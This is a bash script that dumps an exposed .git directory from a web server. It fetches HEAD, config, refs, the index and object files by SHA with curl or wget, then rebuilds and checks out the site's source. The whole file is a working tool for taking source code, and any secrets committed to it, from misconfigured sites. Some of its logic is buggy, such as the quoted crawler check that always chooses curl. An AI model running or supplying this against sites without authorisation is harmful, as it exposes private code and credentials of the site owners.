#!/bin/bash

if [[ -z $1 ]]; then
    cat<<EOF
Usage:
    $0 hostname/directory
    (directory is optional)
Example:
    $0 www.example.com/images (would crawl http://example.com/images/.git/)
    $0 www.example.com (would crawl http://example.com/.git/)
EOF
exit 1
else
    #Parse out directories and build base url
    if [[ $1 =~ "/" ]] ; then
        HOST=${1%%/*}
        DIR=${1#*/}
    else
        HOST=$1
        DIR=""
    fi
    if [[ -e $DIR ]]; then
        BASEURL="http://${HOST}/.git/"
    else
        BASEURL="http://${HOST}/${DIR}/.git/"
    fi
fi

CURL_AVAILABLE=`which curl`
WGET_AVAILABLE=`which wget`
if [[ -z $CURL_AVAILABLE && -z $WGET_AVAILABLE ]]; then
    echo "Unable to find useable http client (need curl or wget)"
    exit 1
elif [ -e $WGET_AVAILABLE ]; then
    CRAWLER='wget'
else
    CRAWLER='curl'
fi

OFS=$IFS
export IFS="/"
DIR_COUNT=0
for word in $DIR; do
    let DIR_COUNT=$DIR_COUNT+1
done
export IFS=$OFS

# FUNCTIONS HERP DERP
function get {
    if [ '$CRAWLER' == 'wget' ]; then
        wget $BASEURL$1 -x -nH --cut-dirs=$DIR_COUNT
    else
        curl $BASEURL$1 -s -S --create-dirs -o .git/$1
    fi
}

function getsha {
    dir=${1:0:2}
    filename=${1:2:40}
    get "objects/${dir}/${filename}"
}

#####################

# 1 - git init
git init ${HOST}
cd ${HOST}

#2 - get static files
get "HEAD"
get "config"

#3 - get ref from HEAD
ref=`cat .git/HEAD|awk '{print $2}'`
get $ref

#4 - get object from ref
getsha `cat .git/$ref`

#5 - get index
get "index"

echo "About to make `git ls-files|wc -l` requests to ${HOST}; This could take a while"
read -p "Do you want to continue? (y/n)"
[ "$REPLY" == "y" ] || exit

#6 - Try and download objects based on sha values
for line in `git ls-files --stage|awk '{print $2}'`
do
    getsha $line
done

#7 - try and get more objects based on log references
file="asdf"
prev=""
while [ "$file" != "" ]
do
    prev=$file
    file=`git log 2>&1 |grep "^error:"|awk '{print $5}'`
    if [ "$file" == "$prev" ]
    then
        break
    fi
    getsha $file
done

#8 - try and checkout files. It's not perfect, but you might get lucky
for line in `git ls-files`
do
    git checkout $line
done
